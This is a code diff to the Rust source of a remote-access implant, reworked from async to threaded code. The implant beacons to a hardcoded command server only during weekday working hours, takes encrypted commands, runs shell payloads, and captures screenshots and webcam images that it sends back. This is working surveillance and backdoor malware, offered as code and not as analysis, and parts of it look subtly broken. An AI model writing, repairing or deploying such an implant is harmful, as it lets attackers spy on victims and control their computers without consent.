@@ -1,10 +1,10 @@
-use async_std::net::TcpStream;
-use async_std::task;
-use std::path::Path;
+use std::net::{SocketAddr, TcpStream};
+use std::path::{Path, PathBuf};
 use std::process::Output;
-use std::io::{Read, Write, prelude::*};
+use std::net::IpAddr;
+use std::io::{Read, Write};
 use std::process::Command;
-use std::sync::{Arc, Mutex};
+use std::sync::{LazyLock, Arc, Mutex};
 use std::fs::{File, create_dir};
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 use std::thread;
@@ -14,19 +14,20 @@ use base64::engine::general_purpose;
 use base64::Engine;
 use ::image::EncodableLayout;
 use sha2::digest::generic_array::GenericArray;
-use sysinfo::{System, SystemExt};
-use rand::{CryptoRng, Rng, RngCore};
+use sysinfo::System;
+use rand::{Rng, RngCore};
 use screenshots::{Screen, image};
 use chrono::{Local, Datelike, Timelike};
 use sha2::{Sha256, Digest, Sha512};
 use pbkdf2::pbkdf2_hmac;
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
-use opencv::{core, highgui, imgcodecs, prelude::*, videoio};
+use opencv::{core, imgcodecs, prelude::*, videoio};
 
 // Constants
 const CVER: &str = "0.2.0";
 const TYPE: &str = "rust";
 const CHUNK_SIZE: usize = 1024;
+const LOGGING: bool = true; // Set this to true or false as needed
 const SERVER_ADDRESS: &str = "10.0.0.29";
 const SERVER_PORT: u16 = 54678;
 const MAX_RETRIES: u32 = 5;
@@ -43,13 +44,11 @@ const BEACON_MAX_INTERVAL: u64 = 45 * 60 * 1000; // 45 minutes
 const SESSION_ID_LENGTH: usize = 32;
 
 // Global variables (using Arc<Mutex<>> for shared mutable state)
-static LOGGING: bool = true; // Set this to true or false as needed
-static CLIENT: Arc<Mutex<Option<TcpStream>>> = Arc::new(Mutex::new(None));
-static BEACON_INTERVAL_INSTANCE: Arc<Mutex<Option<thread::JoinHandle<()>>>> = Arc::new(Mutex::new(None));
-static LOG_STREAM: Arc<Mutex<Option<File>>> = Arc::new(Mutex::new(None));
-static START_TIME: SystemTime = SystemTime::now();
-static EXIT_PROCESS: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
-static SESSION_ID: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
+static CLIENT: LazyLock<Arc<Mutex<Option<TcpStream>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
+static LOG_STREAM: LazyLock<Arc<Mutex<Option<File>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
+static START_TIME: LazyLock<SystemTime> = LazyLock::new(|| SystemTime::now());
+static EXIT_PROCESS: LazyLock<Arc<Mutex<bool>>> = LazyLock::new(|| Arc::new(Mutex::new(false)));
+static SESSION_ID: LazyLock<Arc<Mutex<Option<String>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
 
 fn log_it(message: &str) {
     if LOGGING {
@@ -63,28 +62,29 @@ fn log_it(message: &str) {
     }
 }
 
-fn get_session_id(ip_address: &str) -> Result<String, Box<dyn Error>> {
-    if ip_address.is_empty() {
-        log_it("Invalid input provided");
-        return Err("Invalid input provided".into());
-    }
+fn get_session_id(ip_address: SocketAddr) -> Result<String, Box<dyn Error>> {
+    // Extract the IP address without the port
+    let ip: IpAddr = ip_address.ip();
+    
+    // Handle IPv6 localhost
+    let ip_copy: IpAddr = if ip == IpAddr::V6(std::net::Ipv6Addr::LOCALHOST) {
+        IpAddr::V4(std::net::Ipv4Addr::LOCALHOST)
+    } else {
+        ip
+    };
 
-    // Remove port if present and handle IPv6 localhost
-    let ip_copy: String = ip_address.split(':').next()
-        .ok_or("Invalid IP format")?
-        .replace("::1", "127.0.0.1");
-
-    // Parse IP and calculate sum
-    let sum: u32 = match ip_copy.parse::<IpAddr>()? {
-        IpAddr::V4(ip) => ip.octets().iter().map(|&x| x as u32).sum(),
+    // Calculate sum for IPv4, or use 0 for IPv6
+    let sum: u32 = match ip_copy {
+        IpAddr::V4(ipv4) => ipv4.octets().iter().map(|&x| x as u32).sum(),
         IpAddr::V6(_) => 0,  // We don't sum IPv6 addresses
     };
 
     // Prepare hash input
-    let hash_input: String = format!("{}<>{}", ip_address, sum);
+    let hash_input = format!("{}<>{}", ip_copy, sum);
 
-    // Compute SHA256 hash with key
-    let mut hasher = Sha256::new(hash_input.as_bytes());
+    // Compute SHA256 hash
+    let mut hasher = Sha256::new();
+    hasher.update(hash_input.as_bytes());
     let hash = hasher.finalize();
 
     // Convert hash to hex and truncate to SESSION_ID_LENGTH characters
@@ -151,7 +151,34 @@ fn get_retry_interval(retries: usize) -> u64 {
     RETRY_INTERVALS.get(retries).cloned().unwrap_or(0)
 }
 
-async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn Error>> {
+fn beacon_interval_thread() {
+    let mut rng = rand::thread_rng();
+
+    while !EXIT_PROCESS.load(Ordering::Relaxed) {
+        let sleep_duration = rng.gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
+        thread::sleep(Duration::from_millis(sleep_duration));
+
+        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap();
+        let seconds = now.as_secs();
+        let (hours, minutes, seconds) = (seconds / 3600 % 24, (seconds / 60) % 60, seconds % 60);
+        let day_of_week = (seconds / 86400 + 4) % 7; // 0 is Thursday
+
+        // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
+        if day_of_week >= 1 && day_of_week <= 5 && hours >= 7 && hours <= 19 {
+            send_beacon();
+        }
+    }
+}
+
+fn start_beacon_interval() -> thread::JoinHandle<()> {
+    // Send the first beacon
+    send_beacon();
+
+    // Create and start the thread
+    thread::spawn(beacon_interval_thread)
+}
+
+fn send_command(response: serde_json::Value) -> Result<(), Box<dyn Error>> {
     let session_id: String = SESSION_ID.lock().unwrap().clone().ok_or("Session ID not set")?;
     let encrypted: String = encrypt_data(&serde_json::to_string(&response)?, &session_id)?;
     
@@ -175,7 +202,7 @@ async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn Error>>
     Ok(())
 }
 
-async fn send_beacon() -> Result<(), Box<dyn Error>> {
+fn send_beacon() -> Result<(), Box<dyn Error>> {
     let response: serde_json::Value = serde_json::json!({
         "response": {
             "beacon": true,
@@ -187,11 +214,7 @@ async fn send_beacon() -> Result<(), Box<dyn Error>> {
             "hostname": System::host_name().unwrap_or_default()
         }
     });
-    send_command(response).await
-}
-
-fn sleep(ms: u64) {
-    thread::sleep(Duration::from_millis(ms));
+    send_command(response)
 }
 
 fn utf8_to_16(s: &str) -> Vec<u16> {
@@ -208,7 +231,7 @@ fn format_file_name(name: &str, extension: &str) -> String {
     )
 }
 
-async fn run_webcam_clip() -> Result<(), Box<dyn Error>> {
+fn run_webcam_clip() -> Result<(), Box<dyn Error>> {
     // Set the file name for saving the image
     let file_name: String = format_file_name("wc", "jpg");
 
@@ -225,16 +248,16 @@ async fn run_webcam_clip() -> Result<(), Box<dyn Error>> {
     camera.read(&mut frame)?;
 
     // Check if the frame is empty
-    if frame.empty()? {
+    if frame.empty() {
         return Err("Failed to capture frame".into());
     }
 
     // Encode the frame as JPEG
-    let mut buf: Vec<u8> = Vec::new();
-    imgcodecs::imencode(".jpg", &frame, &mut buf, &core::Vector::new())?;
+    let mut opencv_buf: core::Vector<u8> = core::Vector::new();
+    imgcodecs::imencode(".jpg", &frame, &mut opencv_buf, &core::Vector::new())?;
 
     // Convert the image buffer to base64
-    let encoded_image: String = general_purpose::STANDARD.encode(&buf);
+    let encoded_image: String = general_purpose::STANDARD.encode(&opencv_buf);
 
     // Send the command (assuming send_command is defined elsewhere)
     send_command(serde_json::json!({
@@ -242,12 +265,12 @@ async fn run_webcam_clip() -> Result<(), Box<dyn Error>> {
             "download": file_name,
             "data": encoded_image
         }
-    })).await?;
+    }))?;
 
     Ok(())
 }
 
-async fn run_screenshot() -> Result<(), Box<dyn Error>> {
+fn run_screenshot() -> Result<(), Box<dyn Error>> {
     let file_name: String = format_file_name("ss", "jpg");
     
     let screen: Screen = screenshots::Screen::all()?[0];
@@ -258,12 +281,12 @@ async fn run_screenshot() -> Result<(), Box<dyn Error>> {
             "download": file_name,
             "data": general_purpose::STANDARD.encode(buffer.as_bytes())
         }
-    })).await?;
+    }))?;
 
     Ok(())
 }
 
-async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<String, Box<dyn Error>> {
+fn run_command(command: &str, payload: &str, is_file: bool) -> Result<String, Box<dyn Error>> {
     let command: &str = command.trim();
     if command.is_empty() {
         return Err("No command provided.".into());
@@ -318,7 +341,7 @@ fn format_time(milliseconds: u64) -> String {
     format!("{}d {}h {}m {}s", days, hours, minutes, seconds)
 }
 
-async fn get_uptime() -> Result<(), Box<dyn Error>> {
+fn get_uptime() -> Result<(), Box<dyn Error>> {
     let start: SystemTime = *START_TIME;
     let uptime: Duration = SystemTime::now().duration_since(start)?;
     let formatted_uptime: String = format_time(uptime.as_millis() as u64);
@@ -327,12 +350,12 @@ async fn get_uptime() -> Result<(), Box<dyn Error>> {
         "response": {
             "data": formatted_uptime
         }
-    })).await?;
+    }))?;
 
     Ok(())
 }
 
-async fn parse_action(action: &str) -> Result<(), Box<dyn Error>> {
+fn parse_action(action: &str) -> Result<(), Box<dyn Error>> {
     let parts: Vec<&str> = action.trim().split_whitespace().collect();
     if parts.is_empty() {
         return Err("No action provided".into());
@@ -346,22 +369,22 @@ async fn parse_action(action: &str) -> Result<(), Box<dyn Error>> {
             if properties.is_empty() {
                 return Err("No payload provided".into());
             }
-            let payload: String = String::from_utf8(base64::decode(properties[0])?)?;
-            let result: String = run_command(command, &payload, false).await?;
-            send_command(serde_json::json!({"response": {"data": result}})).await?;
+            let payload: String = String::from_utf8(general_purpose::STANDARD.decode(properties[0])?)?;
+            let result: String = run_command(command, &payload, false)?;
+            send_command(serde_json::json!({"response": {"data": result}}))?;
         },
         "up" => {
-            get_uptime().await?;
+            get_uptime()?;
         },
         "di" => {
             *EXIT_PROCESS.lock().unwrap() = true;
             std::process::exit(0);
         },
         "ss" => {
-            run_screenshot().await?;
+            run_screenshot()?;
         },
         "wc" => {
-            run_webcam_clip().await?;
+            run_webcam_clip()?;
         },
         _ => return Err(format!("Unknown command: {}", command).into()),
     }
@@ -369,7 +392,7 @@ async fn parse_action(action: &str) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-async fn connect_to_server() -> Result<(), Box<dyn Error>> {
+fn connect_to_server() -> Result<(), Box<dyn Error>> {
     let mut retry_count: u32 = 0;
 
     loop {
@@ -378,10 +401,11 @@ async fn connect_to_server() -> Result<(), Box<dyn Error>> {
                 log_it("Client connected");
                 *CLIENT.lock().unwrap() = Some(stream.try_clone()?);
 
-                let session_id: String = get_session_id(&CLIENT.lock().unwrap().as_ref().unwrap())?;
+                let peer_addr: SocketAddr = stream.peer_addr().unwrap();
+                let session_id: String = get_session_id(peer_addr)?;
                 *SESSION_ID.lock().unwrap() = Some(session_id);
 
-                send_beacon().await?;
+                send_beacon()?;
 
                 let beacon_interval: u64 = rand::thread_rng().gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
                 let start_time: Instant = Instant::now();
@@ -390,12 +414,12 @@ async fn connect_to_server() -> Result<(), Box<dyn Error>> {
                     if start_time.elapsed().as_millis() >= beacon_interval as u128 {
                         let now: chrono::DateTime<Local> = Local::now();
                         if now.weekday().num_days_from_monday() < 5 && (7..=19).contains(&now.hour()) {
-                            send_beacon().await?;
+                            send_beacon()?;
                         }
                         break;
                     }
 
-                    let mut buffer: [u8; 1024] = [0; 1024];
+                    let mut buffer = [0; 1024];
                     match stream.read(&mut buffer) {
                         Ok(0) => {
                             log_it("Connection closed by server");
@@ -406,7 +430,7 @@ async fn connect_to_server() -> Result<(), Box<dyn Error>> {
                             log_it(&format!("Received data: {}", data));
                             let session_id: String = SESSION_ID.lock().unwrap().clone().unwrap();
                             let decrypted: String = decrypt_data(&data, &session_id)?;
-                            parse_action(&decrypted).await?;
+                            parse_action(&decrypted)?;
                         }
                         Err(e) => {
                             log_it(&format!("Error reading from socket: {}", e));
@@ -437,13 +461,18 @@ async fn connect_to_server() -> Result<(), Box<dyn Error>> {
 
 fn main() -> Result<(), Box<dyn Error>> {
     if LOGGING {
-        let logs_dir = Path::new("logs");
+        let logs_dir: &Path = Path::new("logs");
         if !logs_dir.exists() {
             create_dir(logs_dir)?;
         }
-        let log_file = logs_dir.join("client.log");
+        let log_file: PathBuf = logs_dir.join("client.log");
         *LOG_STREAM.lock().unwrap() = Some(File::create(log_file)?);
     }
 
-    task::block_on(connect_to_server())
+    connect_to_server();
+
+    let beacon_thread = start_beacon_interval();
+
+    // Wait for the thread to finish
+    beacon_thread.join().unwrap();
 }
